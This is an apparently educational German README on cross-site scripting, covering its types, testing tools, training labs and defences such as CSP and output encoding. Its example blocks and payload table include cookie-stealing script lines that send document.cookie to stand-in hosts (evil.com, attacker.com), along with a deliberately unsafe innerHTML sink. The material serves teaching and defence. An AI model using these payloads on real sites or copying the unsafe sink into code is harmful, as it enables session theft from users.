# ⚠️ Cross-Site Scripting (XSS) – Überblick, Typen, Schutz

## 📘 Einleitung

**Cross-Site Scripting (XSS)** ist eine Web-Sicherheitslücke, bei der Angreifer **schädlichen JavaScript-Code** in Webseiten einschleusen, der im Browser anderer Benutzer ausgeführt wird.

💡 XSS zählt laut [OWASP Top 10](https://owasp.org/www-project-top-ten/) seit Jahren zu den **häufigsten Sicherheitslücken** in Webanwendungen.

---

## 🧠 Grundlagen & Ziel

**Ziel von XSS**:  
➡️ Ausführen von JavaScript im Kontext des Opfers, z. B. um:
- Cookies zu stehlen (`document.cookie`)
- Session-Tokens zu exfiltrieren
- Inhalte zu verändern (defacement)
- Phishing-Popups anzuzeigen
- Keylogging durchzuführen
- Zugriff auf Browser-APIs (z. B. `localStorage`) zu erlangen

---

## 🧨 Typen von XSS

### 1. **Reflected XSS** (nicht persistent)

- Eingabe wird sofort über Antwort reflektiert (z. B. über URL-Parameter)
- Kein Speichern auf dem Server
- Typisch: Formulare, URLs, Suchfelder

**Beispiel:**
```html
URL: http://example.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (persistent)

- Bösartiger Code wird dauerhaft gespeichert (z. B. in Kommentaren, Foren, Profilfeldern)
- Wird jedes Mal bei Anzeige ausgeführt

Beispiel:
```html
<!-- Ein Benutzer speichert im Kommentar: -->
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```

### 3. DOM-based XSS

- Manipuliert das DOM rein im Browser, ohne dass der Server beteiligt ist
- XSS entsteht durch unsichere JavaScript-Verarbeitung im Frontend

Beispiel:
```javascript
// gefährlich:
document.body.innerHTML = location.hash;
// Beispiel-URL: http://site.com/#<img src=x onerror=alert(1)>
```

----

## 🛠️ Nützliche XSS Payloads

| Zweck                   | Beispiel-Payload                                                   |
| ----------------------- | ------------------------------------------------------------------ |
| Einfacher Test          | `<script>alert(1)</script>`                                        |
| HTML-Injection          | `<img src=x onerror=alert(1)>`                                     |
| Cookie stehlen          | `<script>fetch('http://attacker.com?c='+document.cookie)</script>` |
| DOM XSS                 | `#<img src=x onerror=alert(1)>`                                    |
| JavaScript-only (Event) | `<body onload=alert(1)>`                                           |

🔐 Tipp: Nutze Tools wie [XSS Cheat Sheet (PortSwigger)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## 🧪 Praxis – Testen mit XSS

### 🔬 Tools

| Tool                   | Beschreibung                               |
| ---------------------- | ------------------------------------------ |
| Burp Suite             | Proxy zum Einfügen & Abfangen von Payloads |
| OWASP ZAP              | Automatisierte Scans + manuelles Testen    |
| XSS Hunter             | Entdeckung & Überwachung von Blind XSS     |
| XSStrike               | Fuzzer mit intelligenter Erkennung         |
| Google Chrome DevTools | Testumgebung im Browser                    |

### 🧪 Testbare Labs

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [HackTheBox Academy: XSS Fundamentals](https://academy.hackthebox.com/)
- [TryHackMe: XSS Room](https://tryhackme.com/room/xss)

---

## 🛡️ Schutzmaßnahmen gegen XSS

### ✅ Server-seitiger Schutz

| Maßnahme                      | Beschreibung                                      |
| ----------------------------- | ------------------------------------------------- |
| Input Validierung             | Unerwartete Zeichen blockieren oder escapen       |
| Output-Encoding               | Spezielle Zeichen vor HTML-Ausgabe entschärfen    |
| Content Security Policy (CSP) | Einschränkung erlaubter Skriptquellen             |
| HTTPOnly-Flag bei Cookies     | Schutz vor JavaScript-Zugriff auf Session         |
| Frameworks nutzen             | Z. B. React, Vue: automatische Kontext-Isolierung |


### ✅ Client-seitiger Schutz

CSP Header z. B.:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

X-XSS-Protection Header (veraltet, aber teilweise wirksam):
```http
X-XSS-Protection: 1; mode=block
```

---

## 📚 Bonus: XSS in modernen Frameworks

- React, Angular, Vue nutzen intern DOM-Sanitizer
- Problematisch bleiben:
    - `dangerouslySetInnerHTML` (React)
    - `v-html` (Vue)
    - `innerHTML`, `document.write()`, `eval()` (JS allgemein)

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---


### 🧾 Nützliche Links

- [OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet (OWASP)](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings: XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
